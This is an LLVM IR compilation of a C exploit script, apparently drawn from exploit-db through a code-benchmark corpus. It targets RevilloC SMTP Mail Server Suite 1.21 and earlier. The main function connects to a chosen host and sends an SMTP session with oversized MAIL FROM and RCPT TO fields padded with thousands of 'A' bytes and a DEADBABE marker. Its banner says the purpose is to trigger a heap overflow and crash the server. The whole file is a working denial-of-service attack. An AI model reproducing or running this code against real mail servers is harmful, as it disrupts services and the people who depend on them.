; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_2650.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_2650.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64, i32 }
%struct.sockaddr_in = type { %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@main.overflow = internal global [65000 x i8] zeroinitializer, align 16
@main.buff2 = internal global [65000 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [62 x i8] c"\0A===========================================================\0A\00", align 1
@.str.1 = private unnamed_addr constant [60 x i8] c"0-day RevilloC SMTP Mail Server Suite <= 1.21 RCPT TO: DoS\0A\00", align 1
@.str.2 = private unnamed_addr constant [65 x i8] c"Exploits the RCPT TO parameter (MAIL FROM can be exploited too)\0A\00", align 1
@.str.3 = private unnamed_addr constant [61 x i8] c"Buffer > 4080 causes the app to crash - heap based overflow\0A\00", align 1
@.str.4 = private unnamed_addr constant [79 x i8] c"Exploit and Discovered By: Greg Linares (glinares.code [at ] gmail [dot] com)\0A\00", align 1
@.str.5 = private unnamed_addr constant [64 x i8] c"==============================================================\0A\00", align 1
@.str.6 = private unnamed_addr constant [29 x i8] c"Usage: %s [hostname] [port]\0A\00", align 1
@.str.7 = private unnamed_addr constant [21 x i8] c"default port is 25 \0A\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"25\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [36 x i8] c"Error setting up with WinSock v1.1\0A\00", align 1
@.str.10 = private unnamed_addr constant [23 x i8] c"ERROR: Uknown host %s\0A\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@SOCKET_ERROR = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [21 x i8] c"ERROR: Socket Error\0A\00", align 1
@.str.13 = private unnamed_addr constant [22 x i8] c"ERROR: Connect Error\0A\00", align 1
@.str.14 = private unnamed_addr constant [54 x i8] c"Connected to [%s] on port [%d], sending overflow....\0A\00", align 1
@.str.15 = private unnamed_addr constant [19 x i8] c"ERROR: Recv Error\0A\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.17 = private unnamed_addr constant [39 x i8] c"ERROR: NO  response from SMTP service\0A\00", align 1
@main.Exp1 = internal global [65000 x i8] zeroinitializer, align 16
@__const.main.Exp = private unnamed_addr constant [10 x i8] c"RCPT TO: \00", align 1
@__const.main.tail = private unnamed_addr constant [10 x i8] c"@a.com>\0D\0A\00", align 1
@__const.main.A = private unnamed_addr constant [2 x i8] c"A\00", align 1
@.str.18 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@__const.main.EHLO = private unnamed_addr constant [8 x i8] c"EHLO \0D\0A\00", align 1
@__const.main.MF = private unnamed_addr constant [16 x i8] c"MAIL FROM: <HI@\00", align 16
@.str.19 = private unnamed_addr constant [5 x i8] c"\DE\AD\BA\BE\00", align 1
@.str.20 = private unnamed_addr constant [38 x i8] c"Overflow Packet Sent Successfully...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.hostent*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca [300 x i8], align 16
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i16, align 2
  %16 = alloca [10 x i8], align 1
  %17 = alloca [10 x i8], align 1
  %18 = alloca [2 x i8], align 1
  %19 = alloca [8 x i8], align 1
  %20 = alloca [16 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %21 = load i32, i32* %4, align 4
  %22 = icmp sle i32 %21, 1
  br i1 %22, label %23, label %36

23:                                               ; preds = %2
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str, i64 0, i64 0))
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.1, i64 0, i64 0))
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.2, i64 0, i64 0))
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.3, i64 0, i64 0))
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.4, i64 0, i64 0))
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.5, i64 0, i64 0))
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.6, i64 0, i64 0), i8* %32)
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0))
  %35 = call i32 @exit(i32 0) #4
  unreachable

36:                                               ; preds = %2
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  store i8* %39, i8** %14, align 8
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 2
  %42 = load i8*, i8** %41, align 8
  %43 = icmp ne i8* %42, null
  br i1 %43, label %44, label %49

44:                                               ; preds = %36
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 2
  %47 = load i8*, i8** %46, align 8
  %48 = call zeroext i16 @atoi(i8* %47)
  store i16 %48, i16* %15, align 2
  br label %51

49:                                               ; preds = %36
  %50 = call zeroext i16 @atoi(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0))
  store i16 %50, i16* %15, align 2
  br label %51

51:                                               ; preds = %49, %44
  %52 = call i32 @MAKEWORD(i32 1, i32 1)
  %53 = call i64 @WSAStartup(i32 %52, i32* %6)
  %54 = icmp slt i64 %53, 0
  br i1 %54, label %55, label %59

55:                                               ; preds = %51
  %56 = load i32, i32* @stderr, align 4
  %57 = call i32 @fprintf(i32 %56, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.9, i64 0, i64 0))
  %58 = call i32 @exit(i32 -1) #4
  unreachable

59:                                               ; preds = %51
  %60 = load i8*, i8** %14, align 8
  %61 = call %struct.hostent* @gethostbyname(i8* %60)
  store %struct.hostent* %61, %struct.hostent** %7, align 8
  %62 = load %struct.hostent*, %struct.hostent** %7, align 8
  %63 = icmp eq %struct.hostent* %62, null
  br i1 %63, label %64, label %70

64:                                               ; preds = %59
  %65 = load i8*, i8** %14, align 8
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.10, i64 0, i64 0), i8* %65)
  %67 = load i8*, i8** %14, align 8
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0), i8* %67)
  %69 = call i32 @exit(i32 -1) #4
  unreachable

70:                                               ; preds = %59
  %71 = load %struct.hostent*, %struct.hostent** %7, align 8
  %72 = getelementptr inbounds %struct.hostent, %struct.hostent* %71, i32 0, i32 1
  %73 = load i32, i32* %72, align 8
  %74 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %73, i32* %74, align 4
  %75 = load i16, i16* %15, align 2
  %76 = call i32 @htons(i16 zeroext %75)
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %76, i32* %77, align 4
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %79 = load %struct.hostent*, %struct.hostent** %7, align 8
  %80 = getelementptr inbounds %struct.hostent, %struct.hostent* %79, i32 0, i32 0
  %81 = load i64, i64* %80, align 8
  %82 = inttoptr i64 %81 to %struct.in_addr*
  %83 = bitcast %struct.in_addr* %78 to i8*
  %84 = bitcast %struct.in_addr* %82 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %83, i8* align 4 %84, i64 4, i1 false)
  %85 = load i32, i32* @AF_INET, align 4
  %86 = load i32, i32* @SOCK_STREAM, align 4
  %87 = call i32 @socket(i32 %85, i32 %86, i32 0)
  store i32 %87, i32* %11, align 4
  %88 = load i32, i32* @SOCKET_ERROR, align 4
  %89 = icmp eq i32 %87, %88
  br i1 %89, label %90, label %93

90:                                               ; preds = %70
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.12, i64 0, i64 0))
  %92 = call i32 @exit(i32 -1) #4
  unreachable

93:                                               ; preds = %70
  %94 = load i32, i32* %11, align 4
  %95 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %96 = call i32 @connect(i32 %94, %struct.sockaddr* %95, i32 12)
  %97 = load i32, i32* @SOCKET_ERROR, align 4
  %98 = icmp eq i32 %96, %97
  br i1 %98, label %99, label %105

99:                                               ; preds = %93
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.13, i64 0, i64 0))
  %101 = load i32, i32* %11, align 4
  %102 = call i32 @closesocket(i32 %101)
  %103 = call i32 (...) @WSACleanup()
  %104 = call i32 @exit(i32 -1) #4
  unreachable

105:                                              ; preds = %93
  %106 = load i8*, i8** %14, align 8
  %107 = load i16, i16* %15, align 2
  %108 = zext i16 %107 to i32
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.14, i64 0, i64 0), i8* %106, i32 %108)
  %110 = load i32, i32* %11, align 4
  %111 = getelementptr inbounds [300 x i8], [300 x i8]* %9, i64 0, i64 0
  %112 = call i32 @recv(i32 %110, i8* %111, i32 300, i32 0)
  store i32 %112, i32* %12, align 4
  %113 = load i32, i32* @SOCKET_ERROR, align 4
  %114 = icmp eq i32 %112, %113
  br i1 %114, label %115, label %121

115:                                              ; preds = %105
  %116 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.15, i64 0, i64 0))
  %117 = load i32, i32* %11, align 4
  %118 = call i32 @closesocket(i32 %117)
  %119 = call i32 (...) @WSACleanup()
  %120 = call i32 @exit(i32 1) #4
  unreachable

121:                                              ; preds = %105
  %122 = load i32, i32* %12, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds [300 x i8], [300 x i8]* %9, i64 0, i64 %123
  store i8 0, i8* %124, align 1
  %125 = getelementptr inbounds [300 x i8], [300 x i8]* %9, i64 0, i64 0
  %126 = call i8* @strstr(i8* %125, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  store i8* %126, i8** %10, align 8
  %127 = load i8*, i8** %10, align 8
  %128 = icmp eq i8* %127, null
  br i1 %128, label %129, label %135

129:                                              ; preds = %121
  %130 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.17, i64 0, i64 0))
  %131 = load i32, i32* %11, align 4
  %132 = call i32 @closesocket(i32 %131)
  %133 = call i32 (...) @WSACleanup()
  %134 = call i32 @exit(i32 -1) #4
  unreachable

135:                                              ; preds = %121
  %136 = call i32 @memset(i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.Exp1, i64 0, i64 0), i32 0, i32 4096)
  %137 = bitcast [10 x i8]* %16 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %137, i8* align 1 getelementptr inbounds ([10 x i8], [10 x i8]* @__const.main.Exp, i32 0, i32 0), i64 10, i1 false)
  %138 = bitcast [10 x i8]* %17 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %138, i8* align 1 getelementptr inbounds ([10 x i8], [10 x i8]* @__const.main.tail, i32 0, i32 0), i64 10, i1 false)
  %139 = bitcast [2 x i8]* %18 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %139, i8* align 1 getelementptr inbounds ([2 x i8], [2 x i8]* @__const.main.A, i32 0, i32 0), i64 2, i1 false)
  %140 = call i32 @memset(i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.overflow, i64 0, i64 0), i32 0, i32 65000)
  %141 = call i32 @memset(i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.buff2, i64 0, i64 0), i32 0, i32 100)
  store i32 0, i32* %13, align 4
  br label %142

142:                                              ; preds = %147, %135
  %143 = load i32, i32* %13, align 4
  %144 = icmp slt i32 %143, 100
  br i1 %144, label %145, label %150

145:                                              ; preds = %142
  %146 = call i32 @strcat(i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.buff2, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i64 0, i64 0))
  br label %147

147:                                              ; preds = %145
  %148 = load i32, i32* %13, align 4
  %149 = add nsw i32 %148, 1
  store i32 %149, i32* %13, align 4
  br label %142

150:                                              ; preds = %142
  %151 = bitcast [8 x i8]* %19 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %151, i8* align 1 getelementptr inbounds ([8 x i8], [8 x i8]* @__const.main.EHLO, i32 0, i32 0), i64 8, i1 false)
  %152 = bitcast [16 x i8]* %20 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %152, i8* align 16 getelementptr inbounds ([16 x i8], [16 x i8]* @__const.main.MF, i32 0, i32 0), i64 16, i1 false)
  %153 = getelementptr inbounds [16 x i8], [16 x i8]* %20, i64 0, i64 0
  %154 = call i32 @strcat(i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.overflow, i64 0, i64 0), i8* %153)
  %155 = call i32 @strcat(i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.overflow, i64 0, i64 0), i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.buff2, i64 0, i64 0))
  %156 = getelementptr inbounds [10 x i8], [10 x i8]* %17, i64 0, i64 0
  %157 = call i32 @strcat(i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.overflow, i64 0, i64 0), i8* %156)
  %158 = load i32, i32* %11, align 4
  %159 = getelementptr inbounds [8 x i8], [8 x i8]* %19, i64 0, i64 0
  %160 = getelementptr inbounds [8 x i8], [8 x i8]* %19, i64 0, i64 0
  %161 = call i32 @strlen(i8* %160)
  %162 = call i32 @send(i32 %158, i8* %159, i32 %161, i32 0)
  %163 = call i32 @Sleep(i32 500)
  %164 = load i32, i32* %11, align 4
  %165 = call i32 @strlen(i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.overflow, i64 0, i64 0))
  %166 = call i32 @send(i32 %164, i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.overflow, i64 0, i64 0), i32 %165, i32 0)
  %167 = call i32 @Sleep(i32 1000)
  %168 = getelementptr inbounds [10 x i8], [10 x i8]* %16, i64 0, i64 0
  %169 = call i32 @strcat(i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.Exp1, i64 0, i64 0), i8* %168)
  store i32 0, i32* %13, align 4
  br label %170

170:                                              ; preds = %176, %150
  %171 = load i32, i32* %13, align 4
  %172 = icmp slt i32 %171, 4096
  br i1 %172, label %173, label %179

173:                                              ; preds = %170
  %174 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 0
  %175 = call i32 @strcat(i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.Exp1, i64 0, i64 0), i8* %174)
  br label %176

176:                                              ; preds = %173
  %177 = load i32, i32* %13, align 4
  %178 = add nsw i32 %177, 1
  store i32 %178, i32* %13, align 4
  br label %170

179:                                              ; preds = %170
  %180 = call i32 @strcat(i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.Exp1, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.19, i64 0, i64 0))
  %181 = getelementptr inbounds [10 x i8], [10 x i8]* %17, i64 0, i64 0
  %182 = call i32 @strcat(i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.Exp1, i64 0, i64 0), i8* %181)
  %183 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.Exp1, i64 0, i64 0))
  %184 = load i32, i32* %11, align 4
  %185 = call i32 @strlen(i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.Exp1, i64 0, i64 0))
  %186 = call i32 @send(i32 %184, i8* getelementptr inbounds ([65000 x i8], [65000 x i8]* @main.Exp1, i64 0, i64 0), i32 %185, i32 0)
  %187 = call i32 @Sleep(i32 2000)
  %188 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.20, i64 0, i64 0))
  %189 = load i32, i32* %11, align 4
  %190 = call i32 @closesocket(i32 %189)
  %191 = call i32 (...) @WSACleanup()
  %192 = load i32, i32* %3, align 4
  ret i32 %192
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local zeroext i16 @atoi(i8*) #1

declare dso_local i64 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @htons(i16 zeroext) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @closesocket(i32) #1

declare dso_local i32 @WSACleanup(...) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i8* @strstr(i8*, i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @Sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
